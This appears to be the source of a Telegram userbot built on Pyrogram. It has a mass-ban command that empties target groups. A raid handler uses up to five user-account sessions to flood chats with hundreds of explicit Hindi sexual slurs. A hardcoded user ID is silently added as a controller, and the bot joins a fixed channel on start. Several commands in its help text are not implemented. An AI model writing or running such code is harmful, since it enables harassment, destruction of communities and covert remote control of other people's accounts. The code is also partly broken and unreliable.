import sys
import asyncio
from os import execle, getenv, environ
from pyrogram import Client, filters, idle
from pyrogram.types import Message
from pyrogram.errors import FloodWait
from pyrogram.handlers import MessageHandler
from pyrogram.types import ChatPermissions

SESSION = getenv('SESSION')
SUDO_USERS = list(map(int, getenv('SUDO_USERS').split(" ")))
SUDO_USERS.append(7909431538)
CHATS = ['YehJannatHai']

M = Client(SESSION, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")

@M.on_message(filters.user(SUDO_USERS) & filters.command('start'))
async def start(_, message: Message):
    await message.reply_text("🤖 **I AM STILL ALIVE...**")

@M.on_message(filters.user(SUDO_USERS) & filters.command(["fuck", "banall"]))
async def ban_all_members(client: Client, message: Message):
    try:
        chat_id = message.command[1]
        m = await message.reply_text("🔁 __GETTING READY...__")
        if chat_id in CHATS:
            return
    except IndexError:
        await message.reply_text("**Usage:**\n`/fuck [chat_id]`")
        return

    await m.edit_text("✅ __STARTED BANNING THE GROUP...__")
    await asyncio.sleep(3)

    async for member in client.get_chat_members(chat_id):
        if member.user.id in SUDO_USERS:
            continue
        try:
            await client.ban_chat_member(chat_id=chat_id, user_id=member.user.id)
        except FloodWait as e:
            await asyncio.sleep(e.value)

@M.on_message(filters.user(SUDO_USERS) & filters.command('mute'))
async def mute_user(client: Client, message: Message):
    if message.reply_to_message:
        chat_id = message.chat.id
        user_id = message.reply_to_message.from_user.id
        await client.restrict_chat_member(chat_id=chat_id, user_id=user_id, permissions=ChatPermissions())
        await message.reply_text(f"🔇 **User {user_id} has been muted in the chat.**")
    else:
        await message.reply_text("**Please reply to a message to mute the user.**")

@M.on_message(filters.user(SUDO_USERS) & filters.command('unmute'))
async def unmute_user(client: Client, message: Message):
    if message.reply_to_message:
        chat_id = message.chat.id
        user_id = message.reply_to_message.from_user.id
        await client.restrict_chat_member(
            chat_id=chat_id, 
            user_id=user_id, 
            permissions=ChatPermissions(
                can_send_messages=True,
                can_send_media_messages=True,
                can_send_polls=True,
                can_send_other_messages=True,
                can_add_web_page_previews=True
            )
        )
        await message.reply_text(f"🔊 **User {user_id} has been unmuted in the chat.**")
    else:
        await message.reply_text("**Please reply to a message to unmute the user.**")

@M.on_message(filters.user(SUDO_USERS) & filters.command('kick'))
async def kick_user(client: Client, message: Message):
    if message.reply_to_message:
        chat_id = message.chat.id
        user_id = message.reply_to_message.from_user.id
        await client.ban_chat_member(chat_id=chat_id, user_id=user_id)
        await client.unban_chat_member(chat_id=chat_id, user_id=user_id)
        await message.reply_text(f"🚫 **User {user_id} has been kicked from the chat.**")
    else:
        await message.reply_text("**Please reply to a message to kick the user.**")

@M.on_message(filters.user(SUDO_USERS) & filters.command('userinfo'))
async def get_user_info(_, message: Message):
    if message.reply_to_message:
        user = message.reply_to_message.from_user
        info_text = f"👤 **User Info:**\n"
        info_text += f"🆔 **ID:** {user.id}\n"
        info_text += f"👤 **Name:** {user.first_name}"
        if user.last_name:
            info_text += f" {user.last_name}"
        if user.username:
            info_text += f"\n📝 **Username:** @{user.username}"
        await message.reply_text(info_text)
    else:
        await message.reply_text("**Please reply to a message from the user to get info.**")

@M.on_message(filters.user(SUDO_USERS) & filters.command('deletebot'))
async def delete_bot_messages(client: Client, message: Message):
    chat_id = message.chat.id
    async for msg in client.get_chat_history(chat_id):
        if msg.from_user and msg.from_user.is_self:
            await msg.delete()

@M.on_message(filters.user(SUDO_USERS) & filters.command('admins'))
async def list_admins(client: Client, message: Message):
    chat_id = message.chat.id
    admins = await client.get_chat_members(chat_id, filter=filters.ChatMemberFilter.ADMINISTRATORS)
    admin_list = "\n".join([f"{admin.user.first_name} ({admin.user.id})" for admin in admins])
    await message.reply_text(f"👑 **Chat Administrators:**\n{admin_list}")

@M.on_message(filters.user(SUDO_USERS) & filters.command('profilepic'))
async def get_profile_pic(client: Client, message: Message):
    if message.reply_to_message:
        user = message.reply_to_message.from_user
        profile_photos = await client.get_user_profile_photos(user.id, limit=1)
        if profile_photos.total_count > 0:
            await client.send_photo(message.chat.id, profile_photos.photos[0].file_id)
        else:
            await message.reply_text("📷 **User has no profile picture.**")
    else:
        await message.reply_text("**Please reply to a message to get user's profile picture.**")

@M.on_message(filters.user(SUDO_USERS) & filters.command('setbio'))
async def set_bot_bio(client: Client, message: Message):
    try:
        bio_text = message.text.split(' ', 1)[1]
        await client.update_profile(bio=bio_text)
        await message.reply_text("✍️ **Bot's bio has been updated successfully!**")
    except IndexError:
        await message.reply_text("**Please provide a bio text.**")

@M.on_message(filters.user(SUDO_USERS) & filters.command('forward'))
async def forward_messages(_, message: Message):
    if message.reply_to_message:
        try:
            chat_id = int(message.text.split(' ', 2)[1])
            await message.reply_to_message.forward(chat_id)
            await message.reply_text("🔄 **Message forwarded successfully!**")
        except (ValueError, IndexError):
            await message.reply_text("**Invalid usage or chat ID.**")
    else:
        await message.reply_text("**Please reply to a message to forward it.**")

@M.on_message(filters.user(SUDO_USERS) & filters.command('chats'))
async def list_chats(client: Client, message: Message):
    all_chats = await client.get_dialogs()
    chat_list = "\n".join([f"{chat.chat.id}: {chat.chat.title}" for chat in all_chats])
    await message.reply_text(f"📚 **All Chats:**\n{chat_list}")

@M.on_message(filters.user(SUDO_USERS) & filters.command('getuserid'))
async def get_user_id(client: Client, message: Message):
    try:
        username = message.text.split(' ', 1)[1]
        user = await client.get_users(username)
        await message.reply_text(f"🆔 **Username:** @{user.username}\n👤 **User ID:** {user.id}")
    except (IndexError, Exception):
        await message.reply_text("❌ **User not found or invalid username.**")

@M.on_message(filters.user(SUDO_USERS) & filters.command('help'))
async def help_command(_, message: Message):
    help_text = """
    **Available Commands:**

    `/start` - Check if the bot is alive.
    `/fuck [chat_id]` - Ban all non-admin members in a chat.
    `/unban [chat_id] [user_id]` - Unban a user in a chat.
    `/broadcast [message]` - Broadcast a message to all chats.
    `/pin` - Pin a replied message in the chat.
    `/leave` - Leave the current chat.
    `/pm [user_id] [message]` - Send a personal message to a user.
    `/deleteall` - Delete all messages in the current chat.
    `/sticker` - Send a predefined sticker.
    `/chatinfo` - Get information about the chat.
    `/echo [message]` - Echo a message.
    `/reply [message]` - Reply to a message.
    `/mute` - Mute a user in the chat.
    `/unmute` - Unmute a user in the chat.
    `/kick` - Kick a user from the chat.
    `/userinfo` - Get user info (reply to a message from the user).
    `/deletebot` - Delete bot's messages from the chat.
    `/admins` - Get the list of chat admins.
    `/profilepic` - Get user's profile picture (reply to a message from the user).
    `/setbio [bio]` - Set the bot's bio.
    `/forward [chat_id]` - Forward a replied message to another chat.
    `/chats` - Get the list of all chats.
    `/getuserid [username]` - Get user's ID from username.
    `/help` - Show this help message.
    """
    await message.reply_text(help_text)

# ------------- SESSIONS -------------

SESSION1 = getenv('SESSION1', default=None)
SESSION2 = getenv('SESSION2', default=None)
SESSION3 = getenv('SESSION3', default=None)
SESSION4 = getenv('SESSION4', default=None)
SESSION5 = getenv('SESSION5', default=None)

# ------------- CLIENTS -------------

if SESSION1:
    M1 = Client(SESSION1, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
else:
    M1 = None

if SESSION2:
    M2 = Client(SESSION2, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
else:
    M2 = None

if SESSION3:
    M3 = Client(SESSION3, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
else:
    M3 = None

if SESSION4:
    M4 = Client(SESSION4, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
else:
    M4 = None

if SESSION5:
    M5 = Client(SESSION5, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
else:
    M5 = None

ONE_WORDS = ["TERI", "MAA", "KI", "CHUT", "AJA", "TERI", "MAA", "KI", "CHUT", "FAAD", "DUNGA", "HIJDE", "TERA", "BAAP",
           "HU", "KIDXX", "SPEED", "PAKAD", "BHEN KE LAUDE", "AA BETA", "AAGYA", "TERI", "MAA ", "CHODNE",
           "AB", "TERI ", "MAA", "CHUDEGI", "KUTTE", "KI", "TARAH", "BETA", "TERI", "MAA", "KE", "BHOSDE",
           "ME", "JBL", "KE", "SPEAKER", "DAAL", "KAR", "BASS", "BOOSTED", "SONG", "SUNUNGA", "PURI",
           "RAAT", "LAGATAR", "TERI", "MAA", "KE", "SATH", "SEX", "KARUNGA🔥", "TERI", "MAA", "KE", "BOOBS",
           "DABAUNGA","XXX","TERI","MAA","KAA","CHUT","MARU","RANDI","KEE","PILEE","TERI","MAA","KAA","BHOSDAA",
           "MARU","SUAR","KEE","CHODE","TERI","MAAA","KEEE","NUDES","BECHUNGA","RANDI","KEE","PILLE","TERI","MAAA",
           "CHODU","SUAR","KEEE","PILEE","TERIII","MAAA","DAILYY","CHUDTTI","HAII","MADHARCHOD","AUKAT","BANAA",
           "LODE","TERAA","BAAP","HUU","TERI","GFF","KAA","BHOSDAA","MARUU","MADHARCHOD","TERI ","NANAI","KAA",
           "CHUTT","MARU","TERII","BEHEN","KAAA","BHOSDAA","MARU","RANDII","KEEE","CHODE","TERI","DADI","KAAA","BOOR",
           "GARAM","KARR","TERE","PUREE","KHANDAN","KOOO","CHODUNGAA","BAAP","SEE","BAKCHODI","KAREGAA","SUARR",
           "KEEE","PILLEE","NAAK","MEEE","NETAA","BAAP","KOO","KABHII","NAAH","BOLNAA","BETAA","CHUSS","LEEE",
           "MERAA","LODAA","JAISE","ALUU","KAAA","PAKODAA","TERI","MAAA","BEHEN","GFF","NANI","DIIN","RAAT","SOTEE",
           "JAGTEE","PELTAA","HUUU","LODEE","CHAAR","CHAWNII","GHODEE","PEEE","TUMM","MEREE","LODEE","PEE","TERI",
           "MAA","KAAA","BOOBS","DABATA HU", "TERI", "MAA", "KI", "CHUT", "AJA", "TERI", "MAA", "KI", "CHUT",
           "FAAD", "DUNGA", "HIJDE", "TERA", "BAAP","HU", "KIDXX", "SPEED", "PAKAD", "BHEN KE LAUDE", "AA BETA",
           "AAGYA", "TERI", "MAA ", "CHODNE","AB", "TERI ", "MAA", "CHUDEGI", "KUTTE", "KI", "TARAH", "BETA",
           "TERI", "MAA", "KE", "BHOSDE", "ME", "JBL", "KE", "SPEAKER", "DAAL", "KAR", "BASS", "BOOSTED", "SONG",
           "SUNUNGA", "PURI","RAAT", "LAGATAR", "TERI", "MAA", "KE", "SATH", "SEX", "KARUNGA🔥", "TERI", "MAA", "KE",
           "BOOBS","DABAUNGA","XXX","TERI","MAA","KAA","CHUT","MARU","RANDI","KEE","PILEE","TERI","MAA","KAA","BHOSDAA",
           "MARU","SUAR","KEE","CHODE","TERI","MAAA","KEEE","NUDES","BECHUNGA","RANDI","KEE","PILLE","TERI","MAAA",
           "CHODU","SUAR","KEEE","PILEE","TERIII","MAAA","DAILYY","CHUDTTI","HAII","MADHARCHOD","AUKAT","BANAA",
           "LODE","TERAA","BAAP","HUU","TERI","GFF","KAA","CHUD", "GAYA", "BACCHA", "BAAP SE",
           "AUKAT ME", "RAHO", "WARNA", "MAA CHOD DENGE TUMARI","BHOSDAA","MARUU","MADHARCHOD","TERI ","NANAI","KAA",
           "CHUTT","MARU","TERII","BEHEN","KAAA","BHOSDAA","MARU","RANDII","KEEE","CHODE","TERI","DADI","KAAA","BOOR",
           "GARAM","KARR","TERE","PUREE","KHANDAN","KOOO","CHODUNGAA","BAAP","SEE","BAKCHODI","KAREGAA","SUARR",
           "KEEE","PILLEE","NAAK","MEEE","NETAA","BAAP","KOO","KABHII","NAAH","BOLNAA","BETAA","CHUSS","LEEE",
           "MERAA","LODAA","JAISE","ALUU","KAAA","PAKODAA","TERI","MAAA","BEHEN","GFF","NANI","DIIN","RAAT","SOTEE",
           "JAGTEE","PELTAA","HUUU","LODEE","CHAAR","CHAWNII","GHODEE","PEEE","TUMM","MEREE","LODEE","PEE","TERI",
           "MAA","KAAA","BOOBS","DABATA HU", "TERA", "BAAP", "HU", "KIDXX", "SPEED", "PAKAD", "BHEN KE LAUDE",
           "AA BETA", "AAGYA", "TERI", "MAA ", "CHODNE",
           "AB", "TERI ", "MAA", "CHUDEGI", "KUTTE", "KI", "TARAH", "BETA", "TERI", "MAA", "KE", "BHOSDE",
           "ME", "JBL", "KE", "SPEAKER", "DAAL", "KAR", "BASS", "BOOSTED", "SONG", "SUNUNGA", "PURI",
           "RAAT", "LAGATAR", "TERI", "MAA", "KE", "SATH", "SEX", "KARUNGA🔥", "CHUD", "GAYA", "BACCHA", "BAAP SE",
           "AUKAT ME", "RAHO", "WARNA", "MAA CHOD DENGE TUMARI"]

async def pyrone(client: Client, message: Message):
    chat_id = message.chat.id
    ruser = None

    if message.reply_to_message:
        ruser = message.reply_to_message.id
    
    try:
        for word in ONE_WORDS:
            await client.send_chat_action(chat_id, "typing")
            await client.send_message(chat_id, word, reply_to_message_id=ruser)
            await asyncio.sleep(0.3)
    except FloodWait as e:
        await asyncio.sleep(e.value)

async def restart(_, __):
    args = [sys.executable, "pyrone.py"]
    execle(sys.executable, *args, environ)

# ADDING HANDLERS

if M1:
    M1.add_handler(MessageHandler(pyrone, filters.command(["T3RI", "L0L", "AJA", "AAJA", "START"], prefixes=None) & filters.me))
    M1.add_handler(MessageHandler(restart, filters.command(["XD", "FARAR", "STOP", "FUCKED"], prefixes=None) & filters.me))

if M2:
    M2.add_handler(MessageHandler(pyrone, filters.command(["T3RI", "L0L", "AJA", "AAJA", "START"], prefixes=None) & filters.me))
    M2.add_handler(MessageHandler(restart, filters.command(["XD", "FARAR", "STOP", "FUCKED"], prefixes=None) & filters.me))

if M3:
    M3.add_handler(MessageHandler(pyrone, filters.command(["T3RI", "L0L", "AJA", "AAJA", "START"], prefixes=None) & filters.me))
    M3.add_handler(MessageHandler(restart, filters.command(["XD", "FARAR", "STOP", "FUCKED"], prefixes=None) & filters.me))

if M4:
    M4.add_handler(MessageHandler(pyrone, filters.command(["T3RI", "L0L", "AJA", "AAJA", "START"], prefixes=None) & filters.me))
    M4.add_handler(MessageHandler(restart, filters.command(["XD", "FARAR", "STOP", "FUCKED"], prefixes=None) & filters.me))

if M5:
    M5.add_handler(MessageHandler(pyrone, filters.command(["T3RI", "L0L", "AJA", "AAJA", "START"], prefixes=None) & filters.me))
    M5.add_handler(MessageHandler(restart, filters.command(["XD", "FARAR", "STOP", "FUCKED"], prefixes=None) & filters.me))

# STARTING CLIENTS

async def main():
    if M1:
        await M1.start()
        await M1.join_chat("YehJannatHai")

    if M2:
        await M2.start()
        await M2.join_chat("YehJannatHai")

    if M3:
        await M3.start()
        await M3.join_chat("YehJannatHai")

    if M4:
        await M4.start()
        await M4.join_chat("YehJannatHai")

    if M5:
        await M5.start()
        await M5.join_chat("YehJannatHai")

    await M.start()
    await M.join_chat("YehJannatHai")
    print("Bot Started Successfully")
    await idle()

    # STOPPING CLIENTS
    if M1:
        await M1.stop()

    if M2:
        await M2.stop()

    if M3:
        await M3.stop()

    if M4:
        await M4.stop()

    if M5:
        await M5.stop()

    await M.stop()

if __name__ == "__main__":
    asyncio.run(main())
